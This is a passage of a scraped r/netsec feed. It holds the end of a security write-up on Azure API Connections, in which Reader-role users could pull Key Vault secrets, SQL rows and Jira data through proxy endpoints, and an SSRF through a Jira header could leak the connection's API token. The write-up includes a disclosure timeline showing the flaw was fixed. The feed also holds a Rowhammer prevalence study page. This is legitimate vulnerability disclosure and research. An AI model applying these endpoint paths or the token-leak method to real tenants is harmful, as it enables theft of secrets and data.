some background on the Azure Management API is required. While we cannot know for sure how the developers at Microsoft designed the system, it seems clear to me that initially, the security model of the management API considered that Readers should be allowed to perform  requests. You would have to be  or higher to perform any changes, i.e. using any of the , , , etc methods.</p><p>This can be seen by for instance requiring a number of sensitive endpoints for  to be empty  requests, like <a href=\"https://learn.microsoft.com/en-us/rest/api/appservice/web-apps/list-host-keys\">List Host Keys</a>.</p><p>At Binary Security we have reported a number of vulnerabilities relating to the leaking of sensitive information through insecure  endpoints. The result of this is that the security model has been somewhat changed in recent times, and it is now not obvious if a Reader is allowed to call a  endpoint. This is, however, still a viable attack method, and reading the documentation is still a goldmine for exploitable bugs.</p><p>Getting back to the API Connections, it should be clear that the Management’s <code>/extensions/proxy/{action}</code> endpoints will allow all Readers to call the defined  requests. And while this is not seen as a problem in the ARM world, there is of course no guarantee that the connected API adheres to this security model.</p><h2>Creating an API Connection</h2><p>API Connections are resources in the Azure world, just like Key Vaults, SQL Databases or VMs, but they are not required to be explicitly created. They are automatically created for you when setting up Actions in a Logic App, so even if you have never heard of them before, it is quite possible that there are a lot of them hanging out in your tenant. For instance, creating a connection to your Key Vault is as easy as going to the Logic App Designer view, finding the Key Vaults actions, setting some initial values and authenticating.\n<img src=\"https://binsec.no/assets/images/posts/createkeyvault-connection.png\" alt=\"Sign in to create the connection\"></p><p>This of course requires that the person setting it up, and authenticating to the Key Vault has appropriate access to the Key Vault. After signing in, it is not required to even save the Workflow, the resource is still created, and will need to be explicitly deleted if it is not needed any more.</p><p>The flows for internal Azure Resources are all similar, where you can choose between different authentication types. For external resources, the setup varies, but in all cases, some authentication information is saved within the API Connection in some way, and this is used when querying the API.</p><p>This means that the authentication used on the backend API call is always the same, and does not depend on the user or principal calling the ARM API. Crucially, the backend cannot know whether the call comes from the Logic App or from the proxy endpoint, called by any Reader on the resource.</p><p>The full list of API Connections (Connectors) can be seen <a href=\"https://learn.microsoft.com/en-us/connectors/connector-reference/\">here</a>. The proxy endpoints are not explicitly listed, but they can either be deduced from the API of the connected service, or by querying the  endpoint for that specific Connector, which exposes a Swagger definition of the API. Here we query it for the definition of the Jira Connector:</p><div><div><pre><code>\n\nHTTP/2 200 OK\n&lt;...&gt;\n\n{\n    \"/{connectionId}/3/issue/{issueIdOrKey}\": {\n        \"put\": {\n            \"description\": \"Edits an issue. A transition may be applied and issue properties updated as part of the edit. The edits to the issue's fields are defined using update and fields.\",\n            \"summary\": \"Edit Issue\",\n            \"tags\": [\n                \"Issues\"\n            ],\n            \"operationId\": \"EditIssue\",\n            \"deprecated\": false,\n            \"produces\": [\n                \"application/json\"\n            ],\n            \"consumes\": [\n                \"application/json\"\n            ],\n            \"parameters\": [\n                {\n                    \"name\": \"connectionId\",\n                    \"in\": \"path\",\n                    \"required\": true,\n                    \"type\": \"string\",\n                    \"x-ms-visibility\": \"internal\"\n                },\n                {\n                    \"name\": \"issueIdOrKey\",\n                    \"in\": \"path\",\n                    \"required\": true,\n                    \"type\": \"string\",\n                    \"x-ms-summary\": \"Issue ID or Key\",\n                    \"description\": \"Provide the Issue ID or Key for the issue you wish to edit\",\n                    \"x-ms-url-encoding\": \"single\"\n                },\n&lt;...&gt;\n\n</code></pre></div></div><p>The  in this case is the full path to the  endpoint, something like <code>/subscription/[SUBSCRIPTION_ID]/resourceGroups/[RESOURCE_GROUP]/providers/Microsoft.Web/connections/[CONNECTION_NAME]/extensions/proxy/</code>.</p><p>Armed with this knowledge, we can go searching for sensitive endpoints.</p><p>The Connector for Key Vaults is maybe the one with the highest impact. The Swagger definition includes these sensitive  endpoints</p><ul><li> for listing secrets</li><li><code>/{connectionId}/secrets/{secretName}/value</code> to retrieve the value of the secret</li></ul><p>The SQL Connector is quite similar to the Key Vault, you are basically free to read whatever you want:</p><ul><li><p><code>/{connectionId}/databases</code> -  List Databases</p></li><li><p> - List Datasets</p></li><li><p><code>/{connectionId}/datasets({dataset})/tables({table})/items</code> - Get rows from a table</p></li></ul><p>There is also a hilarious error message here, when trying to do some path traversing in the dataset name. It did not seem to be exploitable in any way, but I bet you have never seen a stacktrace exposed in an HTTP status message:</p><p>The Jira Connector also exposes effectively everything on your Jira instance:</p><ul><li><p><code>/{connectionId}/v2/project/search</code> - List projects</p></li><li><p><code>/{connectionId}/user/permission/search</code> - List users</p></li><li><p> - List issues</p></li><li><p><code>/{connectionId}/issue/{issueKey}</code> - Read an issue</p></li></ul><p>This connector is also interesting because it, of course, must be connected to your Jira instance somewhere else on the Internet. When setting up the connection, the developer gives the connection the URL of the Jira Instance. Incredibly, this is ignored in all subsequent requests, and instead, a special  header must be included in the request. This should point to your Jira instance, but there is no verification, so an attacker is free to SSRF at will. By setting this to an attacker-controlled server, the attacker will receive the API token used by the connection. This effectively also bypasses the restriction on the requests, and allows the attacker to query any endpoint with any method.</p><p>Note that this attack is only possible when using the  authentication mechanism. When using , a GUID is used to identify your Jira Instance.</p><p>All API Connections must be considered insecure as long as Readers can call the backend server. In nearly all cases I have seen, the connection exposes all information on the backend service. In addition to the ones above, this includes:</p><ul><li>Google Mail, Contacts, Calendars</li></ul><p>I think there is significant undiscovered potential in these connections. Without going into detail, I can tell you that API Connections have a significant amount of architecture hidden between the Management Server and the backend API. All calls go from ARM to a  APIM instance containing every tenant’s API Connection, utilizing a <a href=\"https://github.com/Azure/azure-tokens\">Token Store</a>. The initial authentication setup likewise goes through a  Consent server for storing tokens. If this hidden infrastructure is compromised, there will be significant cross-tenant impact as well.</p><p>Hopefully by now, you have realized the impact of a lacking security model. While these endpoints are undocumented, that only makes them harder to find, not exploit. I am confident that any security researcher who had found them would immediately have noticed the glaring security hole it puts in their tenant. Hopefully, this post will allow others to discover more insecurities in Azure, so that we can be more secure in the future.</p><ul><li>Jan 6: Report submitted to Microsoft, both a general for API Connections and one specifically for Jira.</li><li>Jan 7: API Connection case is closed by Microsoft as not valid, I submit it again with more words.</li><li>Jan 10: Microsoft confirms the API Connection vulnerability</li><li>Jan 12-17: Microsoft fixes the API Connection vulnerability by not allowing any requests through  except for .</li><li>Jan 30: Microsoft replies on the Jira ticket, saying they cannot reproduce it, which should be obvious, since now it is fixed.</li><li>Feb 12: Jira Ticket is closed</li><li>Feb 13: Microsoft replies to the API Connection case, saying it has been fixed.</li><li>Feb 20: The case is closed as a duplicate.</li></ul>","contentLength":14090,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1j7yqj6/azures_weakest_link_how_api_connections_spill/"},{"title":"FlippyR.AM: Large-Scale Rowhammer Study","url":"https://flippyr.am/","date":1741606313,"author":"/u/citirix","guid":805,"unread":true,"content":"<section>\n                In 2014,\n                <a href=\"https://users.ece.cmu.edu/~yoonguk/papers/kim-isca14.pdf\" target=\"_blank\">Kim et al.</a>\n                reported a new disturbance effect in modern DRAM that they\n                called Rowhammer. The Rowhammer effect flips bits in\n                inaccessible memory locations just by reading the content of\n                nearby memory locations that are attacker-accessible. They\n                trigger the Rowhammer effect by accessing memory locations at a\n                high frequency, using memory accesses and flushes. The root\n                problem behind Rowhammer is the continuous increase in cell\n                density in modern DRAM. In early 2015,\n                <a href=\"https://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html\" target=\"_blank\">Seaborn and Dullien</a>\n                were the first to demonstrate the security impact of this new\n                disturbance effect. In two different exploit variants, they\n                demonstrated privilege escalation from the Google Chrome NaCl\n                sandbox to native code execution and from unprivileged native\n                code execution to kernel privileges. Later, in 2015,\n                <a href=\"https://arxiv.org/pdf/1507.06955\" target=\"_blank\">Gruss et al.</a>\n                demonstrated that this effect can even be triggered from\n                JavaScript, which they presented in their talk\n                <a href=\"https://media.ccc.de/v/32c3-7197-rowhammer_js_root_privileges_for_web_apps\" target=\"_blank\">\n                    \"Rowhammer.js: Root privileges for web apps?\"</a>\n                at 32C3.\n\n                <p>\n                    Now, in 2024, it is precisely 10 years after Rowhammer was\n                    discovered. We have seen a seemingly endless cat-and-mouse\n                    security game with a constant stream of new attacks and new\n                    defenses. New Rowhammer attacks pushed the boundaries\n                    further with each defense and challenge. While initial\n                    attacks required native code on Intel x86 with DDR3 memory,\n                    subsequent attacks have also been demonstrated on DDR4 and,\n                    more recently, DDR5. Attacks have also been demonstrated on\n                    mobile Arm processors and AMD x86 desktop processors.\n                    Furthermore, instead of native code, attacks from sandboxed\n                    JavaScript or even remote attacks via network have been\n                    demonstrated as well.\n                </p><p>\n                    We want to invite everyone to contribute to solving one of\n                    the biggest unanswered questions about Rowhammer: What is\n                    the real-world prevalence of the Rowhammer effect? How many\n                    systems, in their current configurations, are vulnerable to\n                    Rowhammer? As large-scale studies with hundreds to thousands\n                    of systems are not easy to perform, such a study has not yet\n                    been performed. Therefore, we developed a new framework to\n                    check if your system is vulnerable to Rowhammer,\n                    incorporating the state-of-the-art Rowhammer techniques and\n                    tools. Thus, we invite everyone to participate in this\n                    unique opportunity to join forces and close this research\n                    gap together.\n                </p></section><section><p>\n                    Welcome to our  Study. We want to analyze\n                    the prevalence of Rowhammer in real-world systems. Everybody\n                    can participate in our study. The entire source code is\n                    open-source and available via\n                    <a href=\"https://github.com/iisys-sns/FlippyRAM\" target=\"_blank\">GitHub</a>. You can either build the ISO yourself or run the entire\n                    study using Docker. However, we highly recommend using the\n                    <a href=\"https://flippyr.am/hammeriso.iso\">ISO image</a>. \n                    Simply follow these steps:\n                </p><ol><li> our\n                        <a href=\"https://flippyr.am/hammeriso.iso\">ISO image</a>\n                        and  it to a USB thumb drive (see the\n                        following Links for a instructions on\n                        <a href=\"https://wiki.archlinux.org/title/USB_flash_installation_medium#In_Windows\" target=\"_blank\">Windows</a><a href=\"https://wiki.archlinux.org/title/USB_flash_installation_medium#In_macOS\" target=\"_blank\">MacOS</a><a href=\"https://wiki.archlinux.org/title/USB_flash_installation_medium#In_GNU/Linux\" target=\"_blank\">Linux</a>).\n                    </li><li> the system you want to test using the thumb\n                        drive you created before.\n                    </li><li> the time the experiment should run and\n                         your participation in the study. (When\n                        you do not want to participate in our study, you can\n                        still check if your system is vulnerable to Rowhammer\n                        without submitting any data.)\n                    </li><li> for the experiment to finish</li><li>\n                        You will get a brief overview of the results.\n                        Additionally, the raw results will be stored on the\n                        thumb drive for you to inspect them afterwards.\n                    </li><li>\n                        The results will be uploaded to our server and you can\n                        access them using a URL shown at the end of the test\n                        (only if you confimed to participate before).\n                    </li></ol></section><section><p>\n                    When you upload a valid dataset, you will receive a\n                    cryptographic token. This token is generated by hashing\n                    random data, and when you upload your dataset, we will save\n                    this token separately in our database. This means the token\n                    is not associated with your dataset. This ensures that you\n                    can participate in the raffle without linking the token to\n                    your dataset. Please make sure to bookmark or save this\n                    token. As an incentive, the following two rewards can be\n                    won:\n                </p><ol><li>\n                        The first people to send us 10 valid tokens via e-mail\n                        (<code>flippy underscore ram at hof minus university dot\n                            de</code>) will receive a free flippyr.am t-shirt. We have 10\n                        t-shirts to give away. First come, first served!\n                    </li><li>\n                        Everyone who sends us an e-mail with a valid token will\n                        participate in a raffle and have a chance to win a\n                        €10 Amazon gift card. The more tokens you send us,\n                        the higher your chances are.\n                    </li></ol></section><section><h2>I got a USB Stick at 38C3. How to verify it?</h2><p>You can use the following SHA256 hashes to verify if the USB\n\t\t\t\t\t\t\t\t Stick you got from us is original and was not modified. Because\n\t\t\t\t\t\t\t\t we fixed a minor bug while flashing, there are two different\n\t\t\t\t\t\t\t\t thumb drives, so your thumb drive should have one of the\n\t\t\t\t\t\t\t\t following SHA256 hashes:\n\t\t\t\t\t\t\t\t\t</p><ul><li>Old Version (before bug fix):\n\t\t\t\t\t\t\t\t\t\t\t<code>c3261b3ee53b1da5a24d1d5fa34d09d779991acc23f6f2398c51c51f4eaea6d9</code></li><li>New Version (after bug fix):\n\t\t\t\t\t\t\t\t\t\t\t<code>cb894dcf7926550293efa5baf7776350e44f63ea475bef7c50c752692737a7fb</code></li></ul><p>The SHA256 sums are calculated over the entire devices\n\t\t\t\t\t\t\t\t (e.g., /dev/sdb) and will change at first boot since running\n\t\t\t\t\t\t\t\t the experiment will resize the partitions and store files on\n\t\t\t\t\t\t\t\t the devices.</p></section><section><h2>How to verify the ISO image?</h2><p>The ISO image can be verified using SHA256. The current image\n\t\t\t\t\t\t\t\tuploaded by us has the following hash:\n\t\t\t\t\t\t\t\t</p><ul><li><code>df42c0310e8a576ceeeeb8f56e806b76b256c239a795f8f443dcaf681614bce7</code></li><li><code>7180a19a1599ac07b7cfd8f18a61194a160b482da36981e9d45464bd880d3d9f</code></li></ul></section>","contentLength":7239,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1j7whk7/flippyram_largescale_rowhammer_study/"}],"tags":["netsec"]}